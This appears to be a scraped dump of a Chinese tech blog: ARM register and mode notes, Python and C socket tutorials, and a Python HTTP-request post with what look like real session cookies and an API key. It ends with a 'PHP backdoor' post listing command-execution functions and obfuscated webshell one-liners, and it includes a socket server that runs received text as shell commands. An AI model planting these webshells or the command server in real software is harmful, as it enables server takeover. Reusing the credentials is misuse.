指令还有着一个非常重要的作用，通常他被用作堆栈指针，当然这只是一种习惯用法，用户也可以使用其他的寄存器作为堆栈指针，但在Thumb指令集中，某些指令强制性地要求使用R13作为堆栈指针。 由于处理器的每种运行模式均有自己福利的物理寄存器R13，使其指向该运行模式下的栈空间，这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈恢复，采用这种方式可以保证异常发生后程序的正常执行。 R14（LR）R14 也称作子程序连接寄存器（Subroutine Link Register）或连接寄存器 LR 。当执行 BL 子程序调用指令时，R14 中得到 R15 （程序计数器PC）的备份。 1230x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;func&gt;0x00008d6c &lt;+48&gt;: ...0x00008d70 &lt;+52&gt;: ...123 通常情况下，在汇编代码中不会出现 R14 中产生 PC 备份的指令语句。可以简单的理解为在执行调用的同时，将当前 PC 的指向的值 0x00008d70 减去一条指令的长度，这里是ARM工作状态，指令长度为 0x00000004，并交由R14保存。减去一条指令的原因很简单，不减的话返回的时候中间 0x00008d6c 处的那条指令就被跳过了。 （当前执行的是 0x00008d68 处的指令，0x00008d6c 处的指令处于译码阶段，0x00008d70 的指令处于取指阶段，PC总是指向取指阶段的指令。关于 ARM 处理器的流水线机制和 PC 指向的值 详见下文。） 其他情况下，R14 也可以用作通用寄存器。与之类似，当发生中断或异常时，对应的分组寄存器 R14_svc、R14_irq、R14_fiq、R14_abt 和 R14_und 用来保存 R15 的返回值。 每一种处理器模式在自己的物理 R14 中存放当前子程序的返回地址。当通过BL、BX 等指令调用子程序时，R14就被设置成该子程序的返回地址。例如有汇编指令如下： 执行以下任意一条指令： 12MOV PC，LRBX LR12 在子程序入口处使用以下指令将R14存入堆栈： 1STMFD SP！,&#123;&lt;Regs&gt;,LR&#125;1 对应的，使用以下指令可以完成子程序返回： 1LDMFD SP！,&#123;&lt;Regs&gt;,PC&#125;1 当发生异常中断的时候，该模式下的特定物理R14被设置成该异常模式将要返回的地址。 R15（PC）介绍R15之前先简单了解一下 ARM 处理器的是流水线机制。 ARM7 处理器采用3级流水线来增加处理器指令流的速度，能提供 0.9MIPS/MHz 的指令处理速度。 ARM7 的流水线有3个阶段，因此指令分3个阶段执行。⑴ 取指从存储器装载一条指令⑵ 译码识别将要被执行的指令⑶ 执行处理指令并将结果写会寄存器 对于x86处理器来说，只有完成一条指令的读取和执行后，才会执行下一条指令。这样， PC 始终指向的正在“执行”的指令。而对于 ARM7 来说因为是3级流水线，所以把指令的处理分为了上面所述的3个阶段。所以处理时实际是这样的： ARM 正在执行第1条指令的同时对第2条指令进行译码，并将第3条指令从存储器中取出。因此 ARM7 流水线只有在取第4条指令时，第1条指令才算完成执行。继而 ARM 的 PC 寄存器永远指向当前执行的指令后的第二条指令，即处于取指阶段的指令。 另外，在ARM状态下，最低的两位[1:0]为0，其他位[31:2]用于保存PC；在Thumb状态下，最低位[0]为0，其他位 [31:1]用于保存PC；所以 R15（PC）虽然可以用作通用寄存器，但是有一些指令在使用R15时有一些特殊限制，当违反了这些限制时，程序的执行结果是未知的。 R16（CPSR）寄存器R16用作当前程序状态寄存器 CPSR （Current Program Status Register），可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。 每一种运行模式下又都有一个专用的物理状态寄存器，称为备份的程序状态寄存器 SPSR （Saved Program Status Register），当异常发生时， SPSR 用于保存 CPSR 的当前值，从异常退出时则可由 SPSR 来恢复 CPSR 。 由于用户模式和系统模式不属于异常模式，他们没有 SPSR ，当在这两种模式下访问 SPSR ，结果是未知的。 执行条件标志位ARM 的执行条件与 x86 下面的标志位有些类似，系统通过对这些标志位的判断来确定是否满足执行条件。几乎所有的 ARM 指令都包含一个4位的条件码，位于指令的最高4位。条件码共有16种，每种条件码可用两个字符表示，这两个字符可以添加在指令助记符的后面和指令同时使用。 例如，跳转指令 B 可以加上后缀 EQ 变成 BEQ 表示“相同则跳转”，即当 CPSR 中的Z标志置位时发生跳转。在16种条件标志码中，只有15种可以使用，如下表所示。第十六种（1111）为系统保留，暂时不能使用。 编 码 条件助记符 标志位 含 义 0000 EQ Z=1 相等 0001 NE Z=0 不相等 0010 CS C=1 无符号大于或等于 0011 CC C=0 无符号小于 0100 MI N=1 负值 0101 PL N=0 正值或 0 0110 VS V=1 溢出 0111 VC V=0 无溢出 1000 HI C=1 且 Z=0 无符号大于 1001 LS C=0 且 Z=1 无符号小于或等于 1010 GE N 和 V 相同 有符号大于或等于 1011 LT N 和 V 不相同 有符号小于 1100 GT Z=0 且 N 等于 V 有符号大于 1101 LE Z=1 且 N 不等于 V 有符号小于或等于 1110 AL 任意 无条件执行（不推荐使用） 1111 NV 任意 从不执行（不要使用）","tags":[{"name":"arm","slug":"arm","permalink":"http://yoursite.com/tags/arm/"}]},{"title":"ARM状态结构小记","date":"2017-09-08T14:05:16.000Z","path":"2017/09/08/ARM状态结构小记/","text":"在系统学习ARM寄存器结构和功能之前，有必要先了解一下ARM的工作模式和工作状态。 一、 ARM的工作状态两种状态为： ARM状态（32位） Thumb状态（16位） 用BX Rn指令来进行两种状态的切换：其中BX是跳转指令，Rn是寄存器，如果Rn的位0为1（最低位），则进入Thumb状态；如果Rn的位为0，这进入ARM状态。（ARM指令的后两位始终为0，没有被使用；而Thumb指令的后一位始终为0，没有被使用，因此采用位0来表示ARM指令与Thumb指令的切换标志位。） 例如下面两个指令就可以实现从ARM状态切换到Thumb状态，第一条指令将r6寄存器最低位置为1，接着 bx r6 就切换到了Thumb状态。 1234567……0x00008cfc &lt;+12&gt;: add r6, pc, #10x00008d00 &lt;+16&gt;: bx r60x00008d04 &lt;+20&gt;: ...0x00008d06 &lt;+22&gt;: ...0x00008d08 &lt;+24&gt;: ...……1234567 注：ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容；ARM处理器在处理异常时，不过处理器处于什么状态，则都将切换到ARM状态。 对于 ARM 指令来说，所有的指令长度都是 32 位，并且执行周期大多为单周期，指令都是有条件执行的。而 Thumb 指令的特点如下： 指令执行条件经常不回使用。 源寄存器与目标寄存器经常是相同的。 使用的寄存器数量比较少。 常数的值比较小。 内核中的桶式移动器（barrel shifter）经常是不使用的。 也就是说 16 位的 Thumb 指令一般可以完成 和 32 位 ARM 指令相同的任务。Thumb指令是ARM指令的子集，只要遵循一定的调用规则就可以互相调用。Thumb指令与ARM指令的时间效率和空间效率关系为： 存储空间约为ARM代码的60％～70％ 指令数比ARM代码多约30％～40％ 存储器为32位时ARM代码比Thumb代码快约40％ 存储器为16位时Thumb比ARM代码快约40～50％ 使用Thumb代码，存储器的功耗会降低约30％ 二、 ARM的工作模式七种工作模式为： usr 用户模式：正常用户模式，程序正常执行模式 sys 系统模式：(基本上等同于usr)（System）运行特权操作系统任务 svc 特权模式：（Supervisor）也叫操作系统保护模式，处理软件中断swi reset abt 中止模式：（Abort mode）{数据、指令} 处理存储器故障、实现虚拟存储器和存储器保护 und 未定义指令模式：（Undefined）处理未定义的指令陷阱，支持硬件协处理器的软件仿真 irq 外部中断模式：处理普通中断 fiq 快速中断模式：（Fast Interrupt Request）处理快速中断，支持高速数据传送或通道处理 上述七种工作模式中，除了用户模式之外的其他6种处理器模式称为特权模式。 特权模式下，程序可以访问所有的系统资源，也可以任意地进行处理器模式的切换。 特权模式中，除系统模式外，其他5种模式又称为异常模式。 大多数的用户程序运行在用户模式下，此时，应用程序不能够访问一些受操作系统保护的系统资源，应用程序也不能直接进行处理器模式的切换。 用户模式下，当需要进行处理器模式切换时，应用程序可以产生异常处理，在异常处理中进行处理器模式的切换。 三、 关于状态和模式的切换处理器模式可以通过软件进行切换，也可以通过外部中断或者异常处理过程进行切换。 当应用程序发生异常中断时，处理器进入相应的异常模式。在每一种异常模式下都有一组寄存器，供相应的异常处理程序使用，这样就可以保证在进入异常模式时，用户模式下的寄存器不被破坏。 系统模式并不是通过异常进入的，它和用户模式具有完全一样的寄存器。但是系统模式属于特权模式，可以访问所有的系统资源，也可以直接进行处理器模式切换。它主要供操作系统任务使用。通常操作系统的任务需要访问所有的系统资源，同时该任务仍然使用用户模式的寄存器组，而不是使用异常模式下相应的寄存器组，这样可以保证当异常中断发生时任务状态不被破坏。 Thumb指令低密度及窄存储器时性能高的特点使得其在大多数基于 C 代码的系统汇中有非常广泛的应用，但是有些场合中系统只能使用 ARM 指令，比如： 如果对于速度有比较高的要求，ARM指令在宽存储器中会提供更高的性能。 某些功能只能由 ARM 指令来实现，例如访问 CPSR 寄存器来使能/禁止 中断或改变处理器工作模式；访问协处理器CP15；执行 C 代码不支持的 DSP 算术指令；异常中断（Exception）处理。 另外，在进入异常中断后，内核会自动切换到 ARM 状态。即在异常中断处理程序人口的一些指令是ARM指令，然后根据需要，程序可以切换到 Thumb 工作状态，在异常中断处理程序返回前，程序在切换到 ARM 工作状态。 注：当处理器处于Thumb状态时发生异常（如irq、fiq、und、abt、svc等），则异常处理返回时，自动切换到Thumb状态。需要了解的是，ARM 处理器总是 从 ARM 工作状态开始执行的。因此，如果要在调试器重新运行 Thumb 程序，必须为 该 Thumb 程序添加一个 ARM程序头，然后再切换到Thumb工作状态调用该 Thumb程序。","tags":[{"name":"arm","slug":"arm","permalink":"http://yoursite.com/tags/arm/"}]},{"title":"python socket编程","date":"2017-09-04T14:50:23.000Z","path":"2017/09/04/python-socket编程/","text":"Python 提供了两个基本的 socket 模块。 第一个是 Socket，它提供了标准的 BSD Sockets API。 第二个是 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。 下面讲的是Socket模块功能 1、Socket 类型套接字格式： socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。 socket类型 描述 socket.AF_UNIX 只能够用于单一的Unix系统进程间通信 socket.AF_INET 服务器之间网络通信 socket.AF_INET6 IPv6 socket.SOCK_STREAM 流式socket , for TCP socket.SOCK_DGRAM 数据报式socket , for UDP socket.SOCK_RAW 原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。 socket.SOCK_SEQPACKET 可靠的连续数据包服务 创建TCP Socket： s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)() 创建UDP Socket： s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 2、Socket 函数注意点: 1）TCP发送数据时，已建立好TCP连接，所以不需要指定地址。UDP是面向无连接的，每次发送要指定是发给谁。 2）服务端与客户端不能直接发送列表，元组，字典。需要字符串化repr(data)。 socket函数 描述 服务端socket函数 s.bind(address) 将套接字绑定到地址, 在AF_INET下,以元组（host,port）的形式表示地址. s.listen(backlog) 开始监听TCP传入连接。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。 s.accept() 接受TCP连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。 客户端socket函数 s.connect(address) 连接到address处的套接字。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。 s.connect_ex(adddress) 功能与connect(address)相同，但是成功返回0，失败返回errno的值。 公共socket函数 s.recv(bufsize[,flag]) 接受TCP套接字的数据。数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。 s.send(string[,flag]) 发送TCP数据。将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。 s.sendall(string[,flag]) 完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。 s.recvfrom(bufsize[.flag]) 接受UDP套接字的数据。与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。 s.sendto(string[,flag],address) 发送UDP数据。将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。 s.close() 关闭套接字。 s.getpeername() 返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。 s.getsockname() 返回套接字自己的地址。通常是一个元组(ipaddr,port) s.setsockopt(level,optname,value) 设置给定套接字选项的值。 s.getsockopt(level,optname[.buflen]) 返回套接字选项的值。 s.settimeout(timeout) 设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()） s.gettimeout() 返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。 s.fileno() 返回套接字的文件描述符。 s.setblocking(flag) 如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。 s.makefile() 创建一个与该套接字相关连的文件 3、socket编程思路TCP服务端： 1 创建套接字，绑定套接字到本地IP与端口 socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind() 2 开始监听连接 #s.listen() 3 进入循环，不断接受客户端的连接请求 #s.accept() 4 然后接收传来的数据，并发送给对方数据 #s.recv() , s.sendall() 5 传输完毕后，关闭套接字 #s.close() TCP客户端: 1 创建套接字，连接远端地址 ​ # socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect() 2 连接后发送数据和接收数据 # s.sendall(), s.recv() 3 传输完毕后，关闭套接字 #s.close() 4、Socket编程之服务端代码：1234567891011121314151617181920root@yangrong:/python# cat day5-socket-server.py#!/usr/bin/pythonimport socket #socket模块import commands #执行系统命令模块HOST='10.0.0.245'PORT=50007s= socket.socket(socket.AF_INET,socket.SOCK_STREAM) #定义socket类型，网络通信，TCPs.bind((HOST,PORT)) #套接字绑定的IP与端口s.listen(1) #开始TCP监听while 1: conn,addr=s.accept() #接受TCP连接，并返回新的套接字与IP地址 print'Connected by',addr #输出客户端的IP地址 while 1: data=conn.recv(1024) #把接收的数据实例化 cmd_status,cmd_result=commands.getstatusoutput(data) #commands.getstatusoutput执行系统命令（即shell命令），返回两个结果，第一个是状态，成功则为0，第二个是执行成功或失败的输出信息 if len(cmd_result.strip()) ==0: #如果输出结果长度为0，则告诉客户端完成。此用法针对于创建文件或目录，创建成功不会有输出信息 conn.sendall('Done.') else: conn.sendall(cmd_result) #否则就把结果发给对端（即客户端）conn.close() #关闭连接 5、Socket编程之客户端代码：12345678910111213root@yangrong:/python# cat day5-socket-client.py#!/usr/bin/pythonimport socketHOST='10.0.0.245'PORT=50007s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #定义socket类型，网络通信，TCPs.connect((HOST,PORT)) #要连接的IP与端口while 1: cmd=raw_input(\"Please input cmd:\") #与人交互，输入命令 s.sendall(cmd) #把命令发送给对端 data=s.recv(1024) #把接收的数据定义为变量 print data #输出变量s.close() #关闭连接 6、程序缺限：这是一个简单的socket通信，里面存在一些bug 1.在客户端输入回车，会挂死。 2.服务端返回的数据大于1024，客户端显示不全。 3.单进程，如果多个客户端连接，要排队，前一个断开，后一个客户端才能通信。 不想把代码写的太复杂，简单的说下解决方案： 问题1.在客户端上判断输入为空，要求重新输入。 问题2.在客户端上循环接收，直到接收完。但有没有完客户端是不知道的，需要服务端发一个结束符。 问题3.在服务端导入SocketServer模块，使得每建立一个连接，就新创建一个线程。实现多个客户端与服务端通信。多线程通信原理如下图： python socket参考地址：http://blog.163.com/yi_yixinyiyi/blog/static/136286889201152814341144/ http://blog.sina.com.cn/s/blog_4b5039210100ep72.html http://blog.sina.com.cn/s/blog_523491650100hikg.html","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"socket编程","date":"2017-09-04T14:25:45.000Z","path":"2017/09/04/c-socket编程/","text":"Linux下的socket编程server.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;netinet/in.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string.h&gt; #define MAX_LINE 1024#define INET_ADDR_STR 16 void my_fun(char *p)&#123; if(p == NULL) &#123; return; &#125; for( ; *p != '\\0' ; p++) &#123; if((*p &gt;= 'a') &amp;&amp; (*p &lt;= 'z')) &#123; *p = *p - 32; &#125; &#125; return;&#125;int main(int argc,char **argv)&#123; struct sockaddr_in sin; //服务器通信地址结构 struct sockaddr_in cin; //保存客户端通信地址结构 int l_fd; int c_fd; socklen_t len; char buf[MAX_LINE]; //存储传送内容的缓冲区 char addr_p[INET_ADDR_STR]; //存储客户端地址的缓冲区 int port = 8000; int n; bzero((void *)&amp;sin,sizeof(sin)); sin.sin_family = AF_INET; //使用IPV4通信域 sin.sin_addr.s_addr = INADDR_ANY; //服务器可以接受任意地址 sin.sin_port = htons(port); //端口转换为网络字节序 l_fd = socket(AF_INET,SOCK_STREAM,0); //创建套接子,使用TCP协议 bind(l_fd,(struct sockaddr *)&amp;sin,sizeof(sin)); listen(l_fd,10); //开始监听连接 printf(\"waiting ....\\n\"); while(1) &#123; c_fd = accept(l_fd,(struct sockaddr *)&amp;cin,&amp;len); n = read(c_fd,buf,MAX_LINE); //读取客户端发送来的信息 inet_ntop(AF_INET,&amp;cin.sin_addr,addr_p,INET_ADDR_STR); //将客户端传来地址转化为字符串 printf(\"client IP is %s,port is %d\\n\",addr_p,ntohs(cin.sin_port)); printf(\"content is : %s\\n\", buf); //打印客户端发送过来的数据 my_fun(buf); write(c_fd,buf,n); //转换后发给客户端 close(c_fd); &#125; printf(\"buf = %s\\n\",buf); if((close(l_fd)) == -1) &#123; perror(\"fail to close\\n\"); exit(1); &#125; return 0;&#125; client.c1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;string.h&gt; #define MAX_LINE 1024 int main(int argc,char **argv)&#123; struct sockaddr_in sin; //服务器的地址 char buf[MAX_LINE]; int sfd; int port = 8000; char *str = \"test string\"; char *serverIP = \"127.0.0.1\"; if(argc &gt; 1) &#123; str = argv[1]; //读取用户输入的字符串 &#125; bzero((void *)&amp;sin,sizeof(sin)); sin.sin_family = AF_INET; //使用IPV4地址族 inet_pton(AF_INET,serverIP,(void *)&amp;(sin.sin_addr)); sin.sin_port = htons(port); sfd = socket(AF_INET,SOCK_STREAM,0); connect(sfd,(struct sockaddr *)&amp;(sin),sizeof(sin)); printf(\"str = %s\\n\" , str); write(sfd , str , strlen(str) + 1); read(sfd , buf , MAX_LINE); printf(\"recive from server: %s\\n\" , buf); close(sfd); return 0;&#125;","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"}]},{"title":"python OS 文件/目录方法","date":"2017-09-04T13:28:26.000Z","path":"2017/09/04/python-OS-文件-目录方法/","text":"os 模块提供了非常丰富的方法用来处理文件和目录。 os.pipe()创建一个管道，返回一对文件描述符(r,w)分别为读和写 123456stdinr,stdinw = os.pipe()stderrr,stderrw = os.pipe()os.write(stdinw, \"\\x00\\x0a\\x00\\xff\")os.write(stderrw, \"\\x00\\x0a\\x02\\xff\")proc = subprocess.Popen([\"./input\"] + args, env=dict(os.environ, **env), stdin=stdinr, stderr=stderrr) 上述表示从标准输入中读入&quot;\\x00\\x0a\\x00\\xff&quot;，从标准错误中读入&quot;\\x00\\x0a\\x02\\xff&quot; [os.popen(command, mode[, bufsize]])从一个 command 打开一个管道 command -- 使用的命令。 mode -- 模式权限可以是 &#39;r&#39;(默认) 或 &#39;w&#39;。 bufsize -- 指明了文件需要的缓冲大小：0意味着无缓冲；1意味着行缓冲；其它正值表示使用参数大小的缓冲（大概值，以字节为单位）。负的bufsize意味着使用系统的默认值，一般来说，对于tty设备，它是行缓冲；对于其它文件，它是全缓冲。如果没有改参数，使用系统的默认值。 返回值 ​ 返回一个文件描述符号为fd的打开的文件对象 os.open(file, flags[, mode])打开一个文件，并且设置需要的打开选项，mode参数是可选的 file -- 要打开的文件 flags -- 该参数可以是以下选项，多个使用 &quot;|&quot; 隔开： os.O_RDONLY: 以只读的方式打开 os.O_WRONLY: 以只写的方式打开 os.O_RDWR : 以读写的方式打开 os.O_NONBLOCK: 打开时不阻塞 os.O_APPEND: 以追加的方式打开 os.O_CREAT: 创建并打开一个新文件 os.O_TRUNC: 打开一个文件并截断它的长度为零（必须有写权限） os.O_EXCL: 如果指定的文件存在，返回错误 os.O_SHLOCK: 自动获取共享锁 os.O_EXLOCK: 自动获取独立锁 os.O_DIRECT: 消除或减少缓存效果 os.O_FSYNC : 同步写入 os.O_NOFOLLOW: 不追踪软链接 mode -- 类似 chmod()。 返回值 返回新打开文件的描述符。 os.read(fd, n)从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。 os.write(fd, str)写入字符串到文件描述符 fd中. 返回实际写入的字符串长度 os.close(fd)关闭文件描述符 fd","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"python中网络请求方式总结","date":"2017-09-01T08:39:10.000Z","path":"2017/09/01/python中网络请求方式总结/","text":"python中能够发请求的包有很多种，有urllib、urllib2、urllib3、requests等，而且仅这几个python库，就能衍生出上百种请求方法，一一赘述明显不合适，这里仅仅讲述基础方法以及我所遇到的问题。 发送multipart/form-data; 数据有许多种情形下需要发送multipart/form-data数据，如文件上传、网络验证等 方法一：用urllib2请求1234567891011121314151617181920212223242526272829303132# -*- coding: utf-8 -*-import urllibimport urllib2header=&#123; \"Host\": \"api.surfeasy.com\", \"Connection\": \"keep-alive\", \"SE-Client-Locale\": \"zh-CN\", \"Origin\": \"chrome-extension://odiddbcijempnhhobijfbggjogofdlgl\", \"SE-Client-Type\": \"se0210\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\", \"SE-Client-Name\": \"odiddbcijempnhhobijfbggjogofdlgl\", \"SE-Operating-System\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\", \"SE-Client-API-Key\": \"DCF8EF2E5C791C25797F4F862EEF60DA7510BB4847058A8CE6357EFB4E692C79\", \"SE-Client-Version\": \"1.3.6\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Accept-Language\": \"zh-CN,zh;q=0.8\", \"Cookie\": \"api_session=BAhJIgGvZXlKcFpDSTZNVGt3TXpZNE1qVXNJbTltSWpvM056YzJNREF3TENKMGF5STZJbU01TW1ObU1UbGtOakppCk1qSXdNekZqWXpjd04yVmlNMlZtTUdWak9Ua3dOR1UwTVRGbFpUWXdNamxoWWpNNFl6QmpNbUptTURKaApNelZtWldWa04yRWlMQ0owYlNJNklqSXdNVGN0TVRFdE16QlVNRFU2TXpnNk1EaGFJbjA9CgY6BkVG--8d2bd7b8fab0d29ff09569e326d806e3d8b5ab22; api_session=BAhJIgGvZXlKcFpDSTZNVGt3TXpZNE1qVXNJbTltSWpvM056YzJNREF3TENKMGF5STZJakZtWlRZMVltRTJZV016Ck1HVXhNMlZtTkRSalpEWTJOMll5WkRJd1l6VmxObVkzTVRoaU4yRXhOakE1WVRWbVkyWTNNMk0wWm1ZMApPVFJqTXpRM1lqVWlMQ0owYlNJNklqSXdNVGN0TVRFdE16QlVNRGM2TURnNk5UUmFJbjA9CgY6BkVG--48a4f3899a63984d4061a64ae9864c8f9ecf2ad6\" &#125;data = '''--123456\\rContent-Disposition: form-data; name=\"device_id\"\\r\\rab197fb4782f20bd5808133bdd8121ecd422ffb6\\r--123456--\\r'''#print requests.post(\"https://api.surfeasy.com/v3/geo_lookup\", verify=False, headers=header, data=data).textreq = urllib2.Request(url=\"https://api.surfeasy.com/v2/geo_list\", headers=header)req.add_header('Content-type', \"multipart/form-data; boundary=123456\")req.add_header('Content-length', len(data))req.add_data(data)print urllib2.urlopen(req).read() #读取指定网站的内容 你会发现，我们竟然用post的方法进行了相应的请求！但是这里面有几处十分坑爹的地方 boundary所包含的字符串一定是data中分界的字符串，并且一般以--boundary开头，以--boundary--结尾 注意data数据换行用\\r\\n或者\\x0d\\x0a来分割，最后结尾处也有\\r\\n header头中的Content-type一定得有，但是Content-length却不是必须的 一般Content-Disposition: form-data;数据会先空一行，然后才是数据 本内容参考的是:https://gist.github.com/zhenyi2697/5252801 方法二：用requests请求可能大家会说，requests多简单啊，其实确实是这样的，毕竟requests是专门为黑客开发的一套工具 当然，我们仍然可以利用上述的方法进行请求，我尝试过，仍然可以得到需要的结果！ 现在讲讲另外一种方法 在官方网站上，requests模拟一个表单数据的格式如下： files = {&#39;name&#39;: (, ,, )} 如果有多条内容，就在字典中加入多个内容。 123files = &#123; &apos;device_id&apos;:(None,None,&quot;ab197fb4782f20bd5808133bdd8121ecd422ffb6&quot;)&#125; 然后发送请求 response=requests.post(url,files=files)","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"php后门","date":"2017-08-28T12:39:59.000Z","path":"2017/08/28/php后门/","text":"获取输入数据的手段$\\_GET[&quot;password&quot;] $\\_POST[&quot;password&quot;] $\\_REQUEST[&quot;password&quot;] $\\_COOKIE[&quot;password&quot;] $\\_GET[&quot;password&quot;] $\\_SERVER[&#39;HTTP_USER_AGENT&#39;] $\\_SERVER[&#39;HTTP_HOST&#39;] $_SERVER[&#39;HTTP_REFERER&#39;] $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;] // Accept-Language: $_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;] // Accept-Charset: $_SERVER[&#39;QUERY_STRING&#39;] /?abcdef $_SERVER[&#39;HTTP_X\\_FORWARDED\\_FOR&#39;] $_SERVER[&#39;HTTP_CONNECTION&#39;] // Connection: $_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;] // Accept-Encoding: $_SERVER[&#39;HTTP_ACCEPT&#39;] // Accept: $_SERVER[&#39;HTTP_VIA&#39;] // Via: $_SERVER[&#39;HTTP_CLIENT_IP&#39;] // Client-IP: $_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;] // Upgrade-Insecure-Requests: $_SERVER[&quot;HTTP_CACHE_CONTROL&quot;] // Cache-Control: $_SERVER[&quot;HTTP_KEEP_ALIVE&quot;] // Keep-Alive: $\\_SERVER[&quot;HTTP_AB_CD&quot;] // Ab-Cd: 其实从后面的$\\SERVER[&quot;HTTP\\&quot;]的一些展示可以看出，对于头文件中的任意字段，只需要将-转换为\\，并且将所有字母转化为大写，那么就可以在php后端中进行处理！所以以HTTP开头的内容，其实是自定义内容！ php命令执行函数php提供4种方法执行系统外部命令：exec()、passthru()、system()、 shell_exec()。在开始介绍前，先检查下php配置文件php.ini中是有禁止这是个函数。找到 disable_functions，配置如下： 1disable_functions = 如果“disable_functions=”后面有接上面四个函数，将其删除。默认php.ini配置文件中是不禁止你调用执行外部命令的函数的。 exec()string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) 12345&lt;?php echo exec(\"ls\",$file); echo \"&lt;/br&gt;\"; print_r($file);?&gt; 执行结果： 12test.phpArray( [0] =&gt; index.php [1] =&gt; test.php) 知识点：exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。 passthru()void passthru ( string $command [, int &amp;$return_var ] ) 123&lt;?php passthru(\"ls\");?&gt; 执行结果： 1index.phptest.php 知识点：passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。 system()string system ( string $command [, int &amp;$return_var ] ) 123&lt;?php system(&quot;ls /&quot;);?&gt; 执行结果： 1binbootcgroupdevetchomeliblost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar 知识点：system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。 反撇号`和shell_exec()123&lt;?php echo `pwd`;?&gt; 执行结果： 1/var/www/html 知识点： shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体 popen()resource popen ( string $command , string $mode ) 123456&lt;?php$handle = popen(\"dir\", \"r\");$read = fread($handle, 4096);echo $read;pclose($handle);?&gt; 执行结果： 123456 E:\\wamp\\www\\2017/08/28 19:27 &lt;DIR&gt; .2017/08/28 19:27 &lt;DIR&gt; ..2017/08/20 11:43 656 404.php2017/05/07 13:51 145 302.php 知识点： popen也可以执行命令，知识执行命令时不是很方便 pcntl_exec()void pcntl_exec ( string $path [, array $args [, array $envs ]] ) 123456#exec.php&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;#/tmp/b4dboy.sh#!/bin/bashls -l / php后门12&lt;?php eval($_POST[1]);?&gt;post: 1=system(\"ls\"); 12&lt;?php eval(str_rot13('riny($_CBFG[cntr]);'));?&gt;post: page=system(\"ls\"); 12&lt;?php call_user_func(create_function(null,'assert($_POST[c]);'));?&gt;post: c=system(\"ls\"); 123&lt;?php $x=base64_decode(\"YXNzZXJ0\");$x($_POST['c']);?&gt;中间base64解密为assertpost: c=system(\"ls\"); 12&lt;?php 